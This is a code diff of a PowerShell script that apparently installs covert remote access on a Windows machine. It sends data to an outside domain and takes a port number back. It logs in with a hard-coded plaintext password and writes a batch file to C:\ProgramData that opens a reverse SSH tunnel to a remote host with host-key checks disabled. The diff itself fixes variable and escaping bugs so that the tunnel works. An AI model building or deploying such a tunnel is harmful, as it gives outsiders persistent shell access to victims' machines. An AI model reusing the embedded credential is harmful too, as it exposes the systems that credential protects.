@@ -56,8 +56,8 @@ $domain_name = "proxy1.cryptopredictor.org"
 $response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -UseBasicParsing
 
 # Clean response (remove any percent signs)
-$received_port = $response -replace '%', ''
-$received_port
+$receivedPort = $response -replace '%', ''
+$receivedPort
 
 # Create C:\ProgramData\revssh if it doesn't exist
 if (-not (Test-Path $neutralPath)) {
@@ -167,7 +167,7 @@ $publicKey = (Get-Content $pubKeyFile -Raw).Trim()
 #ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
 #& "C:\ProgramData\ssh_portable\ssh.exe" -o "StrictHostKeyChecking=no" -i $keyFile "$user@$remote_host" "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
 
-Import-Module Posh-SSH
+Import-Module Posh-SSH -Force -Confirm
 
 $password = "DZ04dYFws1POVlm0XeHA" | ConvertTo-SecureString -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential("suser", $password)
@@ -195,13 +195,13 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Wi
 # Create the batch content with properly escaped quotes
 $batContent = @"
 @echo off
-echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host>> "$logFile"
+echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host >> "$logFile"
 timeout /t 30 /nobreak > nul
-C:\ProgramData\ssh_portable\ssh.exe -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
+C:\ProgramData\ssh_portable\ssh.exe -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 $user@$remote_host >> "$logFile" 2>&1
 if %%ERRORLEVEL%% EQU 0 (
-    echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
+    echo [SUCCESS] SSH tunnel established successfully at %%date%% %%time%% >> "$logFile"
 ) else (
-    echo [ERROR] SSH tunnel failed with error code %ERRORLEVEL% at %date%% %time%% >> "$logFile"
+    echo [ERROR] SSH tunnel failed with error code %%ERRORLEVEL%% at %%date%% %%time%% >> "$logFile"
 )
 "@
 
